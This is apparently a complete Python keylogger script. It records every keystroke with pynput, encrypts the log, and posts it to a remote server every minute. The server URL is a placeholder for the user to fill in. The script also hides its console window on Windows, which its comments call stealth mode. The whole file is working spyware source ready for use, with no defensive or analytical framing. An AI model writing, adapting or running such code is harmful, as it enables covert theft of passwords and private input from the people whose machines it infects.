import os
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import threading
import requests

keys = []
key_count = 0
log_file_path = "log.txt"
remote_url = "https://whateveryourserveris.com"  # Replace with your server URL

# Generate or load encryption key
def load_key():
    if not os.path.exists("key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    return key

encryption_key = load_key()
cipher = Fernet(encryption_key)

# Handle each key press
def on_press(key):
    global keys, key_count
    try:
        keys.append(f"{key.char}")
    except AttributeError:
        keys.append(f"[{key.name}]")
    key_count += 1
    
    if key_count >= 10:
        write_file()
        key_count = 0

# Save the logged keys to a file and clear the list
def write_file():
    if not keys:
        return
    log_data = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] " + "".join(keys)
    encrypted_data = cipher.encrypt(log_data.encode())
    with open(log_file_path, "ab") as file:
        file.write(encrypted_data + b"\n")
    keys.clear()

# Send logs to remote server
def send_logs():
    with open(log_file_path, "rb") as file:
        data = file.read()
    try:
        requests.post(remote_url, files={"file": ("log.txt", data)})
    except Exception as e:
        print(f"Failed to upload logs: {e}")

# Background thread to periodically write and send logs
def periodic_tasks(interval=60):
    threading.Timer(interval, periodic_tasks).start()
    write_file()
    send_logs()

# Start the keylogger in stealth mode
def run_keylogger():
    periodic_tasks()  # Start background tasks
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Hide the console window (only works on Windows)
    if os.name == "nt":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    run_keylogger()
